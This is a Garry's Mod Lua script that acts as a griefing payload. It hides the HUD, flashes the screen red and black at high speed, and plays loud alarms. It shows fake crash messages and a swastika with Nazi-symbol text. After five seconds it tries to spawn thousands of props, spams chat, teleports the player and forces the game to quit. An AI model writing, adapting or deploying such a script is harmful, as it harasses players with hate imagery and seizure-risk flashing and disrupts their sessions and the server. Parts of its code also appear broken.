
local loudSounds = {
    "ambient/alarms/klaxon1.wav",
    "ambient/alarms/alarm_citizen_loop1.wav", 
    "ambient/alarms/doomsday_lift_alarm.wav",
    "ambient/alarms/apc_alarm_loop1.wav",
    "buttons/button10.wav",
    "buttons/button11.wav",
    "common/bugreporter_failed.wav",
    "common/stuck1.wav",
    "common/stuck2.wav",
    "common/warning.wav"
}


local errorMessages = {
    "ФАТАЛЬНАЯ ОШИБКА",
    "СИСТЕМНЫЙ СБОЙ", 
    "ТРЕВОГА",
    "CRITICAL ERROR",
    "SYSTEM FAILURE",
    "ACCESS VIOLATION",
    "MEMORY CORRUPTION",
    "KERNEL PANIC",
    "BLUE SCREEN",
    "HARDWARE MALFUNCTION",
    "卐",
    "SWASTIKA",
    "NAZI SYMBOL",
    "HALT AND CATCH FIRE",
    "STACK OVERFLOW",
    "SEGMENTATION FAULT",
    "CORRUPTED MEMORY",
    "EXCEPTION 0xC0000005",
    "PAGE FAULT",
    "GENERAL PROTECTION FAULT"
}


surface.CreateFont("ChaosHuge", {
    font = "Arial",
    size = 80,
    weight = 2000,
    antialias = false
})

surface.CreateFont("ChaosLarge", {
    font = "Arial",
    size = 50, 
    weight = 2000,
    antialias = false
})

surface.CreateFont("ChaosMedium", {
    font = "Arial",
    size = 30,
    weight = 2000, 
    antialias = false
})


timer.Simple(0.1, function()
    for i = 1, 20 do
        timer.Simple(i * 0.05, function()
            surface.PlaySound(loudSounds[math.random(1, #loudSounds)])
        end)
    end
end)


local chaosMessages = {}
local chaosParticles = {}
local startTime = CurTime()


hook.Add("HUDPaint", "TotalChaosScreen", function()
    local currentTime = CurTime()
    local elapsed = currentTime - startTime
    

    if math.sin(elapsed * 20) > 0 then
        surface.SetDrawColor(255, 0, 0, 255)
    else
        surface.SetDrawColor(0, 0, 0, 255)
    end
    surface.DrawRect(0, 0, ScrW(), ScrH())
    

    if math.random(1, 2) == 1 then
        local fonts = {"ChaosHuge", "ChaosLarge", "ChaosMedium"}
        table.insert(chaosMessages, {
            text = errorMessages[math.random(1, #errorMessages)],
            x = math.random(-100, ScrW() + 100),
            y = math.random(-100, ScrH() + 100),
            color = Color(math.random(150, 255), math.random(0, 100), math.random(0, 100)),
            font = fonts[math.random(1, 3)],
            speedX = math.random(-20, 20),
            speedY = math.random(-20, 20),
            angle = math.random(0, 360),
            spin = math.random(-10, 10),
            life = math.random(50, 200)
        })
    end
    
    
    for i, msg in ipairs(chaosMessages) do
        draw.SimpleText(msg.text, msg.font, msg.x, msg.y, msg.color, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        
        
        msg.x = msg.x + msg.speedX
        msg.y = msg.y + msg.speedY
        msg.angle = msg.angle + msg.spin
        msg.life = msg.life - 1
        
        
        if msg.life <= 0 then
            table.remove(chaosMessages, i)
        end
    end
    

    local swastikaSize = 200 + math.sin(elapsed * 5) * 50
    local centerX, centerY = ScrW()/2, ScrH()/2
    local swastikaAngle = elapsed * 100
    
    draw.SimpleText("卐", "ChaosHuge", centerX, centerY, Color(255, 255, 0), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    

    if math.random(1, 10) == 1 then
        surface.SetDrawColor(255, 255, 255, math.random(50, 150))
        surface.DrawRect(math.random(0, ScrW()), math.random(0, ScrH()), math.random(10, 100), math.random(10, 100))
    end
end)


timer.Simple(5, function()

    for i = 1, 10000 do
        timer.Simple(i * 0.0001, function()
            local ent = ents.Create("prop_physics")
            if IsValid(ent) then
                ent:SetModel("models/props_junk/TrashDumpster02.mdl")
                ent:SetPos(Vector(math.random(-10000, 10000), math.random(-10000, 10000), math.random(0, 10000)))
                ent:Spawn()
            end
        end)
    end
    

    for i = 1, 1000 do
        timer.Simple(i * 0.001, function()
            RunConsoleCommand("say", "CRASH_" .. i)
            LocalPlayer():SetPos(Vector(math.random(-10000, 10000), math.random(-10000, 10000), math.random(0, 10000)))
        end)
    end
    

    timer.Simple(3, function()
        for i = 1, 100 do
            LocalPlayer():ConCommand("quit")
            RunConsoleCommand("exit")
        end
    end)
end)


hook.Add("HUDShouldDraw", "HideEverything", function()
    return false
end)


timer.Create("ChaosSounds", 0.2, 0, function()
    surface.PlaySound(loudSounds[math.random(1, #loudSounds)])
end)

print("[TOTAL CHAOS] ACTIVATED - COMPLETE DESTRUCTION IN 5 SECONDS!")
